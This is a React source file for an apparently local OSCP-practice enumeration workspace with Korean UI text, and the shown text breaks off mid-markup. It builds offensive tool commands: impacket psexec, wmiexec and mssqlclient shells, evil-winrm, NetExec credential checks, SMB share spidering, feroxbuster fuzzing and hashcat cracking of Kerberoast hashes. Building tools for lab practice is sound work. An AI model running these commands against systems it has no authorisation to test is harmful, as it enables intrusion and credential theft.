import {
  useEffect, useRef, useState,
  type CSSProperties, type PointerEvent as ReactPointerEvent,
} from "react";
import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
import VpnControl from "./VpnControl";
import InteractiveTerminal from "./InteractiveTerminal";
import ServiceIntelligencePanel from "./ServiceIntelligencePanel";
import "./service-intelligence.css";
import { statusCopy as statusLabel } from "./ui";
import { getServiceGuidance } from "./serviceGuidance";
import { getCredentialAuditProfile } from "./credentialAudit";
import { summarizeCredentialAudit } from "./credentialAuditResult";
import { useCredentialStore } from "./useCredentialStore";
import FuzzingPanel from "./FuzzingPanel";
import SmbShareResults from "./SmbShareResults";
import ServiceList from "./ServiceList";
import ExecutionHistory from "./ExecutionHistory";
import ExecutionMonitor from "./ExecutionMonitor";
import {
  keepSelectedService,
  missingServiceFacts,
  parseSmbShares,
  parseScriptObservations,
  rankInvestigationCommands,
  remainingInvestigationCommands,
  summarizeExecutionResult,
} from "./serviceIntel";
import {
  authContextNotice,
  riskLabel,
  shellQuote,
  sourceLabel,
  type Project,
  type RunState,
  type Target,
} from "./enumerationModel";
import {api} from "./api";
import {useEnumerationQueries} from "./useEnumerationQueries";

export default function App() {
  const qc = useQueryClient();
  // Keyed by template_id: nothing backend-side serializes executions (each
  // is its own asyncio task/subprocess), so the UI tracks as many
  // concurrently-running commands as the user starts, one slot per command.
  const activeEventSourcesRef = useRef<Record<string, EventSource>>({});
  const focusedRunIdRef = useRef<string>();
  const workRef = useRef<HTMLElement>(null);
  const credentialAuditRef = useRef<HTMLElement>(null);
  const servicesResize = useRef({x: 0, width: 235});
  const notesResize = useRef({x: 0, width: 360});
  const notesRef = useRef<HTMLElement>(null);
  const workspaceResize = useRef({y: 0, height: 420});
  const [projectId, setProjectId] = useState<number>();
  const [targetId, setTargetId] = useState<number>();
  const [serviceId, setServiceId] = useState<number>();
  const [output, setOutput] = useState(
    "서비스를 선택하고 검토한 명령을 실행하세요.\n",
  );
  const [executionView, setExecutionView] = useState<"list" | "detail">("list");
  const [selectedExecutionId, setSelectedExecutionId] = useState<number>();
  const [executionDetail, setExecutionDetail] = useState<any>();
  const [lastSpiderShare, setLastSpiderShare] = useState<string>();
  const [evidenceMsg, setEvidenceMsg] = useState("");
  const [psexecSession, setPsexecSession] = useState<
    {id: number; command: string} | undefined
  >();
  const [psexecInputRequest, setPsexecInputRequest] = useState<
    {id: number; data: string} | undefined
  >();
  const [privescServer, setPrivescServer] = useState<
    {running: boolean; port?: number; base_url?: string} | undefined
  >();
  const [privescServerBusy, setPrivescServerBusy] = useState(false);
  const [servicesWidth, setServicesWidth] = useState(() => {
    const saved = Number(localStorage.getItem("oscp-services-panel-width"));
    return saved >= 180 && saved <= 420 ? saved : 235;
  });
  const [servicesCollapsed, setServicesCollapsed] = useState(
    () => localStorage.getItem("oscp-services-panel-collapsed") === "true",
  );
  const [notesWidth, setNotesWidth] = useState(() => {
    const saved = Number(localStorage.getItem("oscp-execution-panel-width"));
    return saved >= 285 && saved <= 720 ? saved : 360;
  });
  const [notesCollapsed, setNotesCollapsed] = useState(
    () => {
      const saved = localStorage.getItem("oscp-execution-panel-collapsed");
      return saved == null ? window.innerWidth < 1500 : saved === "true";
    },
  );
  const [workspaceHeight, setWorkspaceHeight] = useState(() => {
    const saved = Number(localStorage.getItem("oscp-service-workspace-height"));
    return saved >= 180 && saved <= 720 ? saved : 420;
  });
  const [workspaceCollapsed, setWorkspaceCollapsed] = useState(
    () => localStorage.getItem("oscp-service-workspace-collapsed") === "true",
  );
  const [confirm, setConfirm] = useState<any>();
  const [runWithSudo, setRunWithSudo] = useState(true);
  const [serviceNotes, setServiceNotes] = useState("");
  const [serviceTags, setServiceTags] = useState("");
  const [serviceProduct, setServiceProduct] = useState("");
  const [serviceVersion, setServiceVersion] = useState("");
  const [serviceSaveState, setServiceSaveState] = useState<
    "idle" | "saving" | "saved" | "error"
  >("idle");
  const [runStates, setRunStates] = useState<Record<string, RunState>>({});
  // Which run's live output/detail the terminal & status panels follow.
  // Other runs keep executing and updating their own runStates entry
  // regardless of focus — focus only picks what's shown front-and-center.
  const [focusedRunId, setFocusedRunId] = useState<string>();
  const [clock, setClock] = useState(Date.now());
  const {
    projects,
    targets,
    services,
    commands,
    intelligence,
    targetCommands,
    executions,
  } = useEnumerationQueries({projectId, targetId, serviceId});
  const privescServerStatus = useQuery({
    queryKey: ["privescServerStatus"],
    queryFn: () => api<any>("/privesc-server/status"),
  });
  useEffect(() => {
    if (privescServerStatus.data) setPrivescServer(privescServerStatus.data);
  }, [privescServerStatus.data]);
  const status = useQuery({
    queryKey: ["status"],
    queryFn: () => api<any>("/system/status"),
    refetchInterval: 3000,
  });
  useEffect(() => {
    if (!projectId && projects.data?.length) {
      const saved = Number(localStorage.getItem("oscp-workspace-project"));
      setProjectId(projects.data.find((item) => item.id === saved)?.id ||
        projects.data[0].id);
    }
  }, [projects.data]);
  useEffect(() => {
    setTargetId(targets.data?.[0]?.id);
  }, [projectId, targets.data]);
  useEffect(() => {
    if (targetId) dispatchEvent(new CustomEvent("oscp-target-change", {detail: targetId}));
  }, [targetId]);
  useEffect(() => {
    setServiceId((current) => keepSelectedService(current, services.data));
  }, [targetId, services.data]);
  useEffect(() => {
    setExecutionView("list");
    setSelectedExecutionId(undefined);
    setExecutionDetail(undefined);
  }, [serviceId]);
  useEffect(() => {
    const selected = services.data?.find((x) => x.id === serviceId) as any;
    setServiceSaveState("idle");
    setServiceNotes(selected?.notes || "");
    setServiceProduct(selected?.product || "");
    setServiceVersion(selected?.version || "");
    try {
      setServiceTags(JSON.parse(selected?.tags || "[]").join(", "));
    } catch {
      setServiceTags("");
    }
  }, [serviceId, services.data]);
  const anyRunActive = Object.values(runStates).some(
    (r) => ["starting", "running"].includes(r.status),
  );
  useEffect(() => {
    if (!anyRunActive) return;
    const timer = window.setInterval(() => setClock(Date.now()), 1000);
    return () => window.clearInterval(timer);
  }, [anyRunActive]);
  const project = projects.data?.find((x) => x.id === projectId),
    target = targets.data?.find((x) => x.id === targetId),
    service = services.data?.find((x) => x.id === serviceId);
  const credStore = useCredentialStore({
    projectId, targetId, serviceId, serviceName: service?.name,
  });
  const serviceCpes = (() => {
    try {
      const parsed = JSON.parse(service?.cpe || "[]");
      return Array.isArray(parsed) ? parsed.filter(Boolean) : [];
    } catch {
      return [];
    }
  })();
  const guidance = service && target
    ? getServiceGuidance(service.name, target.ip, service.port)
    : null;
  const serviceExecutions =
    executions.data?.filter((item) => item.service_id === serviceId) || [];
  const selectedExecution = serviceExecutions.find(
    (item) => item.id === selectedExecutionId,
  );
  const observations = service
    ? parseScriptObservations(service.scripts)
    : [];
  const missingFacts = service ? missingServiceFacts(service) : [];
  const missingCount =
    missingFacts.length + (target?.hostname ? 0 : 1) + (target?.os_guess ? 0 : 1);
  const completedChecks = serviceExecutions.filter(
    (item) => item.status === "completed",
  ).length;
  const authenticationCommands = (commands.data || []).filter((item) =>
    /(?:anon|null-session|empty-password|unauthenticated|auth-methods|default-audit|community-audit)/i
      .test(item.id),
  );
  const completedTemplateIds = new Set(
    (executions.data || [])
      .filter((item) => item.status === "completed")
      .map((item) => item.template_id),
  );
  const investigationCommands = remainingInvestigationCommands(
    commands.data || [],
    {
      hostname: target?.hostname || "",
      osGuess: target?.os_guess || "",
      product: service?.product || "",
      version: service?.version || "",
      completedTemplateIds,
    },
  );
  const credentialProfile = getCredentialAuditProfile(service?.name);
  const reviewCommand = (command: any) => {
    setRunWithSudo(Boolean(command.sudo));
    setConfirm(command);
  };
  const openSuccessfulFtpTerminal = async (
    templateId: string,
    stdout: string,
    stderr: string,
  ) => {
    if (templateId !== "ftp-anon" || !targetId || !serviceId) return;
    const summary = summarizeCredentialAudit(templateId, stdout, stderr);
    if (summary.status !== "exposed" || !summary.credential) return;
    const session = await api<any>("/interactive-sessions", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({
        target_id: targetId,
        service_id: serviceId,
        template_id: "ftp-client",
        variables: {},
        run_as_root: false,
      }),
    });
    await api<any>(
      `/interactive-sessions/${session.id}/desktop?ftp_anonymous=true`,
      {method: "POST"},
    );
    setOutput((value) =>
      `${value}\n[Kali QTerminal에서 anonymous FTP 로그인 세션을 열었습니다.]\n`
    );
  };
  const autoCheckState = (templateIds: string[], resolved = false) => {
    const candidate = templateIds
      .map((id) => runStates[id])
      .filter((run): run is RunState => !!run)
      .sort((a, b) => b.startedAt - a.startedAt)[0];
    if (!candidate) return null;
    if (["starting", "running"].includes(candidate.status)) {
      const elapsed = Math.max(0, Math.floor((clock - candidate.startedAt) / 1000));
      return {
        busy: true,
        content: (
          <>
            <span className="buttonSpinner" aria-hidden="true" />
            {elapsed}s · 확인 중
          </>
        ),
      };
    }
    if (candidate.status === "completed")
      return {
        busy: false,
        content: resolved ? <>값 확인 완료</> : <>값 미확인 · 다른 명령 시도</>,
      };
    if (candidate.status === "no_response")
      return { busy: false, content: <>결과 없음 · 재시도</> };
    if (["failed", "error", "stopped"].includes(candidate.status))
      return { busy: false, content: <>실패 · 재시도</> };
    return null;
  };
  const createProject = useMutation({
    mutationFn: () =>
      api<Project>("/projects", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name: `OSCP Practice ${Date.now().toString().slice(-4)}`,
          description: "Local lab workspace",
        }),
      }),
    onSuccess: () => qc.invalidateQueries({ queryKey: ["projects"] }),
  });
  const createTarget = useMutation({
    mutationFn: () =>
      api<Target>("/targets", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          project_id: projectId,
          name: "새 대상",
          ip: prompt("대상 IP", "10.10.10.10") || "",
          hostname: "",
          os_guess: "",
          vpn: "tun0",
          notes: "",
        }),
      }),
    onSuccess: () => qc.invalidateQueries({ queryKey: ["targets"] }),
  });
  const run = async (explicitCommand?: any) => {
    const c = explicitCommand ?? confirm;
    if (!c || !targetId) return;
    setConfirm(null);
    if (c.execution_mode === "interactive") {
      try {
        const variables: any = {};
        if (c.command.includes("{username}")) {
          const username = prompt(
            "사용자 이름(인증 과정은 대화형으로 진행됩니다)",
            "",
          );
          if (!username) return;
          variables.username = username;
        }
        const session = await api<any>("/interactive-sessions", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            target_id: targetId,
            service_id: c.target_level ? null : serviceId,
            template_id: c.id,
            variables,
            run_as_root: runWithSudo,
          }),
        });
        await api<any>(`/interactive-sessions/${session.id}/desktop`, {
          method: "POST",
        });
        setOutput(
          `$ ${session.command}\n\n[Kali 데스크톱 터미널에서 실행했습니다.]\n`,
        );
      } catch (reason) {
        const message = reason instanceof Error ? reason.message : String(reason);
        setOutput(`[데스크톱 터미널 실행 실패] ${message}\n`);
      }
      return;
    }
    const templateId = c.id;
    const startedAt = Date.now();
    setClock(startedAt);
    focusedRunIdRef.current = templateId;
    setFocusedRunId(templateId);
    setRunStates((current) => ({
      ...current,
      [templateId]: {
        templateId, name: c.name, status: "starting", startedAt,
        lastEventAt: startedAt,
      },
    }));
    setOutput(`$ ${c.preview}\n\n[실행 요청 중]\n`);
    let e: any;
    try {
      e = await api<any>("/executions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          target_id: targetId,
          service_id: c.target_level ? null : serviceId,
          template_id: c.id,
          variables: c.variables || {},
          run_as_root: runWithSudo,
        }),
      });
    } catch (reason) {
      const message = reason instanceof Error ? reason.message : String(reason);
      setRunStates((current) => current[templateId] ? {
        ...current, [templateId]: {...current[templateId], status: "error", message},
      } : current);
      if (focusedRunIdRef.current === templateId)
        setOutput((value) => `${value}\n[실행 요청 실패] ${message}\n`);
      return;
    }
    setRunStates((current) => current[templateId] ? {
      ...current, [templateId]: {...current[templateId], id: e.id, status: "running"},
    } : current);
    if (focusedRunIdRef.current === templateId)
      setOutput(`$ ${c.preview}\n\n[실행 중 · 작업 #${e.id}]\n`);
    activeEventSourcesRef.current[templateId]?.close();
    const s = new EventSource(`/api/executions/${e.id}/events`);
    activeEventSourcesRef.current[templateId] = s;
    s.onmessage = async (ev) => {
      const d = JSON.parse(ev.data);
      if (d.stream === "heartbeat" || d.stream === "status") {
        setRunStates((current) => current[templateId] ? {
          ...current,
          [templateId]: {
            ...current[templateId],
            lastEventAt: Date.now(),
            processAlive: d.stream === "heartbeat"
              ? Boolean(d.process_alive) : current[templateId].processAlive,
          },
        } : current);
      }
      const isFocused = () => focusedRunIdRef.current === templateId;
      if (d.stream === "status") {
        let result = {
          status: d.status,
          exit_code: d.exit_code,
          error: d.error,
          stdout: "",
          stderr: "",
        };
        try {
          result = await api<any>(`/executions/${e.id}/output`);
        } catch {
          // The live terminal still contains streamed output if saved output lookup fails.
        }
        setRunStates((current) => current[templateId] ? {
          ...current,
          [templateId]: {
            ...current[templateId],
            status: result.status,
            exitCode: result.exit_code,
            message: result.error,
            stdout: result.stdout,
            stderr: result.stderr,
          },
        } : current);
        if (isFocused()) {
          setSelectedExecutionId(e.id);
          setExecutionDetail(result);
          setExecutionView("detail");
        }
        try {
          await openSuccessfulFtpTerminal(
            c.id,
            result.stdout || "",
            result.stderr || "",
          );
        } catch (reason) {
          const message = reason instanceof Error ? reason.message : String(reason);
          setOutput((value) =>
            `${value}\n[성공한 FTP 터미널을 열지 못했습니다] ${message}\n`
          );
        }
        if (isFocused())
          setOutput(
            (x) =>
              x +
              `\n[${statusLabel[d.status] || d.status}${d.exit_code == null ? "" : ` · 종료 코드 ${d.exit_code}`}]`,
          );
        delete activeEventSourcesRef.current[templateId];
        s.close();
        await Promise.all([
          qc.invalidateQueries({ queryKey: ["executions", targetId] }),
          qc.invalidateQueries({ queryKey: ["services", targetId] }),
          qc.invalidateQueries({ queryKey: ["targets", projectId] }),
          qc.invalidateQueries({ queryKey: ["serviceIntelligence"] }),
        ]);
      } else if (d.stream === "stdout" || d.stream === "stderr") {
        if (isFocused()) setOutput((x) => x + d.data);
      }
    };
    s.onerror = () => {
      setRunStates((current) =>
        current[templateId] && ["starting", "running"].includes(current[templateId].status)
          ? {...current, [templateId]: {
              ...current[templateId], status: "error", message: "실시간 연결이 끊겼습니다.",
            }}
          : current,
      );
      delete activeEventSourcesRef.current[templateId];
      s.close();
    };
  };
  const saveService = async () => {
    if (!serviceId) return;
    setServiceSaveState("saving");
    try {
      await api(`/services/${serviceId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          product: serviceProduct,
          version: serviceVersion,
          notes: serviceNotes,
          tags: serviceTags
            .split(",")
            .map((x) => x.trim())
            .filter(Boolean),
        }),
      });
      await qc.invalidateQueries({ queryKey: ["services", targetId] });
      setServiceSaveState("saved");
    } catch {
      setServiceSaveState("error");
    }
  };
  const openExecution = async (id: number) => {
    const data = await api<any>(`/executions/${id}/output`);
    // A still-streaming live run must not overwrite this history view when its
    // own completion event arrives later; clearing focus makes every run's
    // isFocused() check in run() false, so none of them touch this view.
    focusedRunIdRef.current = undefined;
    setFocusedRunId(undefined);
    setSelectedExecutionId(id);
    setExecutionDetail(data);
    setExecutionView("detail");
    setOutput(
      data.stdout +
        data.stderr +
        `\n[${data.status}${data.exit_code == null ? "" : ` · exit ${data.exit_code}`}]`,
    );
  };
  const stopSavedExecution = async () => {
    if (!selectedExecutionId) return;
    await api(`/executions/${selectedExecutionId}/stop`, { method: "POST" });
    await qc.invalidateQueries({ queryKey: ["executions", targetId] });
    setExecutionDetail((current: any) => current && {
      ...current, status: "stopped",
    });
  };
  const stopRun = async (templateId: string) => {
    const id = runStates[templateId]?.id;
    if (!id) return;
    await api(`/executions/${id}/stop`, { method: "POST" });
    setRunStates((current) => current[templateId] ? {
      ...current, [templateId]: { ...current[templateId], status: "stopped" },
    } : current);
    await qc.invalidateQueries({ queryKey: ["executions", targetId] });
  };
  const spiderSmbShare = (share: string) => {
    if (!target || !service) return;
    // run_as_root reads component state, not the command object, so a stale
    // sudo choice from a previously reviewed command would otherwise leak in.
    setRunWithSudo(false);
    setLastSpiderShare(share);
    void run({
      id: "smb-share-spider",
      preview:
        `smbclient -N //${target.ip}/${share} -p ${service.port} -c 'recurse ON;ls'`,
      target_level: false,
      variables: {share},
    });
  };
  const checkNetexecCredential = () => {
    if (!target || !service || !credStore.username.trim() || !netexecProtocol) return;
    setRunWithSudo(false);
    void run({
      id: netexecCredCommandId,
      preview: `nxc ${netexecProtocol} ${target.ip} --port ${service.port}` +
        ` -u ${credStore.username} -p ***`,
      target_level: false,
      variables: {username: credStore.username, password: credStore.password},
    });
  };
  const openManualShell = async (command: string) => {
    if (!targetId || !serviceId) return;
    const session = await api<any>("/interactive-sessions/manual", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({target_id: targetId, service_id: serviceId}),
    });
    setPsexecSession({id: session.id, command});
  };
  const openPsexecShell = async () => {
    if (!target) return;
    const identity = [credStore.domain, credStore.username].filter(Boolean).join("/")
      + (credStore.password ? `:${credStore.password}` : "") + "@" + target.ip;
    await openManualShell(`impacket-psexec ${shellQuote(identity)}`);
  };
  const openLateralShell = async (tool: "wmiexec" | "smbexec" | "atexec") => {
    if (!target) return;
    const identity = [credStore.domain, credStore.username].filter(Boolean).join("/")
      + (credStore.password ? `:${credStore.password}` : "") + "@" + target.ip;
    await openManualShell(`impacket-${tool} ${shellQuote(identity)}`);
  };
  const openSshShell = async () => {
    if (!target || !service || !credStore.username.trim()) return;
    await openManualShell(
      `ssh ${shellQuote(`${credStore.username}@${target.ip}`)} -p ${service.port}`,
    );
  };
  const openEvilWinrmShell = async () => {
    if (!target || !credStore.username.trim()) return;
    await openManualShell(
      `evil-winrm -i ${target.ip} -u ${shellQuote(credStore.username)}` +
      ` -p ${shellQuote(credStore.password)}`,
    );
  };
  const copyXfreerdpCommand = async () => {
    if (!target || !credStore.username.trim()) return;
    await navigator.clipboard.writeText(
      `xfreerdp /v:${target.ip} /u:${shellQuote(credStore.username)}` +
      ` /p:${shellQuote(credStore.password)} /cert:ignore`,
    );
    setOutput((value) => `${value}\n[xfreerdp 명령을 클립보드로 복사했습니다 — RDP는 GUI라 별도 터미널에서 붙여넣어 실행하세요]\n`);
  };
  const openMssqlShell = async () => {
    if (!target || !service || !credStore.username.trim()) return;
    const auth = credStore.domain
      ? `${credStore.domain}/${credStore.username}:${credStore.password}@${target.ip}`
      : `${credStore.username}:${credStore.password}@${target.ip}`;
    await openManualShell(
      `impacket-mssqlclient ${shellQuote(auth)} -port ${service.port}`,
    );
  };
  const openHashcatShell = async () => {
    if (!target) return;
    // Kerberoast TGS-REP hashes are hashcat mode 13100. The manual shell opens
    // in the target dir; the roast file lives under outputs/. User points
    // hashcat at their own wordlist, then registers the cracked password below.
    await openManualShell(
      "hashcat -m 13100 outputs/kerberoast-hashes.txt /usr/share/wordlists/rockyou.txt",
    );
  };
  const viewSmbFile = (path: string) => {
    if (!target || !service || !lastSpiderShare) return;
    setRunWithSudo(false);
    void run({
      id: "smb-share-file-view",
      preview: `smbget -a -q --stdout smb://${target.ip}/${lastSpiderShare}/${path}`,
      target_level: false,
      variables: {share: lastSpiderShare, path},
    });
  };
  // Capture a completed execution's output as command_output evidence so the
  // report chain (what was run, against what, with what result) is preserved
  // and hash-tracked. NetExec/credential output is treated as sensitive.
  const captureEvidence = async (
    execution: {id: number; command?: string; stdout?: string; stderr?: string},
    title: string, sensitivity: "normal" | "sensitive" = "normal",
  ): Promise<number | undefined> => {
    if (!projectId || !targetId) return undefined;
    setEvidenceMsg("");
    try {
      const body = `$ ${execution.command || ""}\n\n${execution.stdout || ""}` +
        `${execution.stderr ? `\n[stderr]\n${execution.stderr}` : ""}`;
      const data = new FormData();
      data.append("project_id", String(projectId));
      data.append("target_id", String(targetId));
      if (serviceId) data.append("service_id", String(serviceId));
      data.append("title", title);
      data.append("description", `자동 캡처 · ${new Date().toLocaleString()}`);
      data.append("kind", "command_output");
      data.append("source_type", "command_output");
      data.append("source_id", String(execution.id));
      data.append("sensitivity", sensitivity);
      data.append("file", new File([body], `execution-${execution.id}.txt`,
        {type: "text/plain"}));
      const response = await fetch("/api/evidence/upload", {method: "POST", body: data});
      const created = await response.json();
      if (!response.ok) throw new Error(created.detail || response.statusText);
      await qc.invalidateQueries({queryKey: ["evidence", projectId]});
      setEvidenceMsg(`Evidence로 저장됨: ${title}`);
      return created.id as number;
    } catch (reason) {
      setEvidenceMsg(`Evidence 저장 실패: ${reason instanceof Error ? reason.message : reason}`);
      return undefined;
    }
  };
  // Promote an attack result to a Draft finding pre-linked to its evidence. The
  // app never sets severity/impact/conclusions — those stay Informational/Draft
  // for the user to author, matching the observation->finding boundary.
  const promoteToFinding = async (
    execution: {id: number; stdout?: string; stderr?: string},
    title: string, reproduction: string, sensitivity: "normal" | "sensitive",
  ) => {
    const evidenceId = await captureEvidence(execution, title, sensitivity);
    if (!evidenceId || !projectId) return;
    try {
      await api("/findings", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          project_id: projectId, target_id: targetId, service_id: serviceId,
          title, status: "Draft", reproduction_steps: reproduction,
          evidence: [{evidence_id: evidenceId, is_primary: true}],
        }),
      });
      await qc.invalidateQueries({queryKey: ["findings", projectId]});
      setEvidenceMsg(`Finding(Draft)으로 승격됨 · Reports에서 내용을 작성하세요: ${title}`);
    } catch (reason) {
      setEvidenceMsg(`Finding 승격 실패: ${reason instanceof Error ? reason.message : reason}`);
    }
  };
  const runDirectoryFuzz = (wordlist: string) => {
    if (!target || !service || !wordlist.trim()) return;
    setRunWithSudo(false);
    const scheme = service.name.toLowerCase().includes("ssl") ? "https" : "http";
    void run({
      id: "http-directory-fuzz",
      preview: `feroxbuster -u ${scheme}://${target.ip}:${service.port}/` +
        ` -w ${wordlist} --json --silent -n`,
      target_level: false,
      variables: {wordlist},
    });
  };
  const togglePrivescServer = async () => {
    setPrivescServerBusy(true);
    try {
      const result = await api<any>(
        `/privesc-server/${privescServer?.running ? "stop" : "start"}`,
        {method: "POST"},
      );
      setPrivescServer(result);
    } finally {
      setPrivescServerBusy(false);
    }
  };
  const sendPrivescCommand = async (command: string) => {
    if (psexecSession) {
      setPsexecInputRequest({id: Date.now(), data: command});
      return;
    }
    await navigator.clipboard.writeText(command);
    setOutput((value) =>
      `${value}\n[psexec 셸이 열려있지 않아 클립보드로 복사했습니다]\n$ ${command}\n`
    );
  };
  const beginNotesResize = (event: ReactPointerEvent<HTMLDivElement>) => {
    notesResize.current = {x: event.clientX, width: notesWidth};
    event.currentTarget.setPointerCapture(event.pointerId);
  };
  const applyServicesWidth = (width: number) => {
    const next = Math.min(420, Math.max(180, width));
    setServicesWidth(next);
    setServicesCollapsed(false);
    localStorage.setItem("oscp-services-panel-width", String(next));
    localStorage.setItem("oscp-services-panel-collapsed", "false");
  };
  const beginServicesResize = (event: ReactPointerEvent<HTMLDivElement>) => {
    servicesResize.current = {x: event.clientX, width: servicesWidth};
    event.currentTarget.setPointerCapture(event.pointerId);
  };
  const resizeServices = (event: ReactPointerEvent<HTMLDivElement>) => {
    if (!event.currentTarget.hasPointerCapture(event.pointerId)) return;
    applyServicesWidth(
      servicesResize.current.width + event.clientX - servicesResize.current.x,
    );
  };
  const finishServicesResize = (event: ReactPointerEvent<HTMLDivElement>) => {
    if (event.currentTarget.hasPointerCapture(event.pointerId))
      event.currentTarget.releasePointerCapture(event.pointerId);
  };
  const applyNotesWidth = (width: number) => {
    const next = Math.min(720, Math.max(285, width));
    setNotesWidth(next);
    setNotesCollapsed(false);
    localStorage.setItem("oscp-execution-panel-width", String(next));
    localStorage.setItem("oscp-execution-panel-collapsed", "false");
  };
  const resizeNotes = (event: ReactPointerEvent<HTMLDivElement>) => {
    if (!event.currentTarget.hasPointerCapture(event.pointerId)) return;
    applyNotesWidth(Math.min(720, Math.max(
      285, notesResize.current.width + notesResize.current.x - event.clientX,
    )));
  };
  const finishNotesResize = (event: ReactPointerEvent<HTMLDivElement>) => {
    if (event.currentTarget.hasPointerCapture(event.pointerId))
      event.currentTarget.releasePointerCapture(event.pointerId);
  };
  const workspaceHeightLimit = () => Math.max(
    180,
    Math.min(720, (notesRef.current?.clientHeight || 900) - 150),
  );
  const applyWorkspaceHeight = (height: number) => {
    const next = Math.min(workspaceHeightLimit(), Math.max(180, height));
    setWorkspaceHeight(next);
    setWorkspaceCollapsed(false);
    localStorage.setItem("oscp-service-workspace-height", String(next));
    localStorage.setItem("oscp-service-workspace-collapsed", "false");
  };
  const beginWorkspaceResize = (event: ReactPointerEvent<HTMLDivElement>) => {
    workspaceResize.current = {y: event.clientY, height: workspaceHeight};
    event.currentTarget.setPointerCapture(event.pointerId);
  };
  const resizeWorkspace = (event: ReactPointerEvent<HTMLDivElement>) => {
    if (!event.currentTarget.hasPointerCapture(event.pointerId)) return;
    applyWorkspaceHeight(
      workspaceResize.current.height + workspaceResize.current.y - event.clientY,
    );
  };
  const finishWorkspaceResize = (event: ReactPointerEvent<HTMLDivElement>) => {
    if (event.currentTarget.hasPointerCapture(event.pointerId))
      event.currentTarget.releasePointerCapture(event.pointerId);
  };
  const upload = async (f: File) => {
    if (!targetId) return;
    const d = new FormData();
    d.append("file", f);
    await api(`/targets/${targetId}/nmap`, { method: "POST", body: d });
    qc.invalidateQueries({ queryKey: ["services", targetId] });
  };
  const missingTools =
    status.data?.tools?.filter((x: any) => !x.installed) || [];
  const focusedRun = focusedRunId ? runStates[focusedRunId] : undefined;
  const runElapsed = focusedRun
    ? Math.max(0, Math.floor((clock - focusedRun.startedAt) / 1000))
    : 0;
  const activeRuns = Object.values(runStates)
    .filter((r) => ["starting", "running"].includes(r.status))
    .sort((a, b) => a.startedAt - b.startedAt);
  const currentOutcome = focusedRun && !["starting", "running"].includes(focusedRun.status)
    ? summarizeExecutionResult(
        focusedRun.templateId, focusedRun.status, focusedRun.stdout,
        focusedRun.stderr,
        serviceExecutions.find((item) => item.id === focusedRun.id)?.command,
      )
    : null;
  const serviceNameLower = (service?.name || "").toLowerCase();
  const netexecProtocol:
    "smb" | "ssh" | "winrm" | "rdp" | "mssql" | "ldap" | undefined =
    ["microsoft-ds", "netbios-ssn", "smb"].includes(serviceNameLower) ? "smb"
    : serviceNameLower === "ssh" ? "ssh"
    : ["wsman", "wsmans", "winrm"].includes(serviceNameLower) ? "winrm"
    : serviceNameLower === "ms-wbt-server" ? "rdp"
    : serviceNameLower === "ms-sql-s" ? "mssql"
    : ["ldap", "ldaps"].includes(serviceNameLower) ? "ldap"
    : undefined;
  const netexecCredCommandId = netexecProtocol && ({
    smb: "smb-credential-check-netexec", ssh: "ssh-credential-check-netexec",
    winrm: "winrm-credential-check-netexec", rdp: "rdp-credential-check-netexec",
    mssql: "mssql-credential-check-netexec", ldap: "ldap-credential-check-netexec",
  } as const)[netexecProtocol];
  const netexecCredentialResult = netexecCredCommandId
    ? runStates[netexecCredCommandId] : undefined;
  const netexecSuccess = netexecCredentialResult?.status === "completed"
    && /^\[\+\]|pwn3d/im.test(netexecCredentialResult.stdout || "");
  const netexecPwned = netexecProtocol === "smb" && netexecSuccess
    && /pwn3d/i.test(netexecCredentialResult?.stdout || "");
  const netexecSshOk = netexecProtocol === "ssh" && netexecSuccess;
  const netexecWinrmOk = netexecProtocol === "winrm" && netexecSuccess;
  const netexecRdpOk = netexecProtocol === "rdp" && netexecSuccess;
  const netexecMssqlOk = netexecProtocol === "mssql" && netexecSuccess;
  const latestSmbEnum = serviceExecutions
    .filter((item) => item.template_id === "smb-enum" && item.status === "completed")
    .sort((a, b) => b.id - a.id)[0];
  const smbOutput = selectedExecution?.template_id === "smb-enum"
    ? executionDetail?.stdout || ""
    : runStates["smb-enum"]?.stdout || latestSmbEnum?.stdout || "";
  const smbShares = parseSmbShares(smbOutput);
  return (
    <div className="app">
      <header>
        <div className="brand">
          <span className="mark">OW</span>
          <div>
            <b>OSCP Workspace</b>
            <small>로컬 Enumeration 작업 공간</small>
          </div>
        </div>
        <div className="target">
          <span>프로젝트</span>
          <b>{project?.name || "프로젝트 없음"}</b>
          <i>/</i>
          <span>대상</span>
          <b>{target?.ip || "—"}</b>
        </div>
        <VpnControl />
      </header>
      <nav>
        <button onClick={() => createProject.mutate()}>＋ 프로젝트</button>
        <select
          value={projectId || ""}
          onChange={(e) => {
            const id = Number(e.target.value);
            setProjectId(id);
            localStorage.setItem("oscp-workspace-project", String(id));
            dispatchEvent(new CustomEvent("oscp-project-change", {detail: id}));
          }}
        >
          <option value="">프로젝트 선택</option>
          {projects.data?.map((p) => (
            <option key={p.id} value={p.id}>
              {p.name}
            </option>
          ))}
        </select>
        <button disabled={!projectId} onClick={() => createTarget.mutate()}>
          ＋ 대상
        </button>
        <select
          value={targetId || ""}
          onChange={(e) => setTargetId(+e.target.value)}
        >
          <option value="">대상 선택</option>
          {targets.data?.map((t) => (
            <option key={t.id} value={t.id}>
              {t.name} · {t.ip}
            </option>
          ))}
        </select>
        <label className="upload">
          Nmap XML 가져오기
          <input
            type="file"
            accept=".xml"
            onChange={(e) => e.target.files?.[0] && upload(e.target.files[0])}
          />
        </label>
        <span
          className="tools"
          title={missingTools.map((item: any) => item.install).join("\n")}
        >
          {status.isLoading
            ? "도구 상태 확인 중"
            : missingTools.length
              ? `미설치: ${missingTools.map((item: any) => item.name).join(", ")}`
              : "필수 도구 설치됨"}
        </span>
      </nav>
      <main
        className="enumerationLayout"
        style={{
          "--services-width": `${servicesCollapsed ? 48 : servicesWidth}px`,
          "--notes-width": `${notesCollapsed ? 48 : notesWidth}px`,
        } as CSSProperties}
      >
        <aside className={`services${servicesCollapsed ? " isCollapsed" : ""}`}>
          <button
            className="panelDockToggle panelDockToggle--services"
            type="button"
